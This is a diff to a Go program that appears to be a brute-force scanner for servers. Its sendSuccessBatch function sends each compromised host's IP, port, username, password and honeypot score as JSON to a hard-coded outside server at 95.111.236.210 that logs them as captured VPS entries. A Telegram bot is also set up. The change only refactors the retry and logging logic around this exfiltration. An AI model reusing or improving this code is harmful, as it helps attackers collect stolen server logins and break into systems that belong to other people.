@@ -446,10 +446,15 @@ func createTelegramBot() *tgbotapi.BotAPI {
 	}
 }
 
+var httpClient = &http.Client{
+	Timeout: 10 * time.Second,
+}
+
 func sendSuccessBatch(batch []Success) {
 	for _, s := range batch {
+
 		data := map[string]interface{}{
-			"target":         fmt.Sprintf("%s:%s", s.Info.IP, s.Info.Port), // Combine IP and port
+			"target":         fmt.Sprintf("%s:%s", s.Info.IP, s.Info.Port),
 			"port":           s.Info.Port,
 			"username":       s.Info.Username,
 			"password":       s.Info.Password,
@@ -468,42 +473,38 @@ func sendSuccessBatch(batch []Success) {
 			"honeypot_score": s.Info.HoneypotScore,
 		}
 
-		// Convert to JSON
 		jsonData, err := json.Marshal(data)
 		if err != nil {
-			fmt.Printf("Error marshaling data: %v\n", err)
+			fmt.Printf("JSON error: %v\n", err)
 			continue
 		}
 
-		// Send to Flask web app
 		url := "http://95.111.236.210:5000/vpsadd"
 
-		// Create HTTP client with timeout
-		client := &http.Client{
-			Timeout: 10 * time.Second,
-		}
+		maxRetry := 5
 
-		for {
-			fmt.Printf("Sending data to %s...\n", url)
-			resp, err := client.Post(url, "application/json", bytes.NewBuffer(jsonData))
+		for attempt := 1; attempt <= maxRetry; attempt++ {
+
+			resp, err := httpClient.Post(url, "application/json", bytes.NewBuffer(jsonData))
 			if err != nil {
-				fmt.Printf("Failed to send to web: %v. Retrying in 3s...\n", err)
-				time.Sleep(3 * time.Second)
+				fmt.Printf("Attempt %d failed: %v\n", attempt, err)
+				time.Sleep(2 * time.Second)
 				continue
 			}
 
 			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
 
 			if resp.StatusCode == http.StatusCreated {
-				fmt.Printf("✅ Successfully logged VPS: %s:%s - Response: %s\n",
-					s.Info.IP, s.Info.Port, string(body))
-				resp.Body.Close()
+				fmt.Printf("✅ Logged %s:%s\n", s.Info.IP, s.Info.Port)
 				break
-			} else {
-				fmt.Printf("❌ Server returned %s: %s. Retrying in 3s...\n",
-					resp.Status, string(body))
-				resp.Body.Close()
-				time.Sleep(3 * time.Second)
+			}
+
+			fmt.Printf("❌ Attempt %d: %s - %s\n", attempt, resp.Status, string(body))
+			time.Sleep(2 * time.Second)
+
+			if attempt == maxRetry {
+				fmt.Printf("⚠️ Gave up sending %s:%s\n", s.Info.IP, s.Info.Port)
 			}
 		}
 	}
